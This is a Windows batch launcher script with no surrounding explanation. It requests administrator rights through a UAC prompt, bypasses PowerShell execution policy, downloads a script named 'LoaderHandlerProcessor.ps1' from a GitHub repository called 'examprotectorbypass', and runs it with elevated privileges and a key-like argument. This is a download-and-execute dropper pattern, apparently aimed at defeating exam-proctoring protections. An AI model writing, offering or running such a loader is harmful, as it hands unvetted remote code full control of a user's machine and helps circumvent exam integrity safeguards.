@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList elevated -Verb RunAs -Wait"
  exit /b 0
)
cd /d "%~dp0"

curl -L -o LoaderHandlerProcessor.ps1 https://github.com/examprotectorbypass/jjs/raw/refs/heads/main/LoaderHandlerProcessor.ps1

powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0\LoaderHandlerProcessor.ps1" -SetupLaunch "DRC-A7F3-9C2E-4B81-6D0F-8E5A1C9B3D72"
